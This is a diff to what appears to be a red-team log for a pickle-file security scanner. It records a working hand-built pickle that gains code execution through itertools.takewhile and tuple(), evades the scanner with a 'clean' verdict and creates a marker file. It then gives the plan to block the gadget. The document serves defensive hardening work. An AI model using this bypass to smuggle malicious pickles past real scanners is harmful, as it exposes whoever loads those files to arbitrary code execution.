@@ -747,3 +747,91 @@ Blocking plan:
 Performance note: the fix adds one string to the small builtin-name
 membership check. It does not add iterable-flow analysis or broader string
 scanning.
+
+## Turn 21 - `itertools.takewhile` forced-iteration call gap
+
+Goal: produce another self-contained code-execution pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+marker = Path("/tmp/ma_itertools_takewhile_tuple_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        s("builtins"),
+        s("tuple"),
+        b"\x93",
+        s("itertools"),
+        s("takewhile"),
+        b"\x93",
+        s("pathlib"),
+        s("Path.touch"),
+        b"\x93",
+        b"]",
+        s("pathlib"),
+        s("PosixPath"),
+        b"\x93(",
+        s("/"),
+        s("tmp"),
+        s("ma_itertools_takewhile_tuple_marker"),
+        b"tRa",
+        b"\x86R",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
+  `notices=[]`
+- Unpickle result: creates `/tmp/ma_itertools_takewhile_tuple_marker` and
+  returns `()`
+- RCE mechanism: the pickle constructs
+  `itertools.takewhile(pathlib.Path.touch, [marker])`, then immediately calls
+  `tuple(...)` on that takewhile object. `takewhile()` stores an
+  attacker-selected predicate callable and iterable inputs, while `tuple()`
+  forces iteration during unpickling, invoking the predicate with
+  attacker-controlled arguments. `Path.touch()` returns `None`, so the returned
+  tuple is empty while the side effect still occurs.
+
+Why the scanner missed it:
+
+- `itertools.takewhile` is absent from `DANGEROUS_GLOBALS`; only
+  `itertools.starmap` is currently listed.
+- The payload uses only currently clean globals: `builtins.tuple`,
+  `itertools.takewhile`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is another lazy arbitrary-call sink that can be forced
+by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
+entry for `("itertools", "takewhile")`, plus a manual-pickle oracle regression
+that proves scan-time detection before unpickle-time marker creation.
+
+## Turn 22 - Block `itertools.takewhile`
+
+Blocking plan:
+
+- Add `("itertools", "takewhile")` to the sorted Rust `DANGEROUS_GLOBALS`
+  table. `tuple` stays allowed because the arbitrary-call sink is
+  `takewhile`; `tuple` only forces iteration.
+- Add portable policy coverage for raw `GLOBAL itertools takewhile`
+  reductions.
+- Add a CPython oracle regression that manually builds
+  `tuple(itertools.takewhile(pathlib.Path.touch, [marker]))`, verifies scanner
+  detection, then verifies the marker file appears only during unpickle.
+
+Performance note: the fix adds one tuple to a sorted static table checked with
+binary search. It does not add iterable-flow analysis or broader string
+scanning.
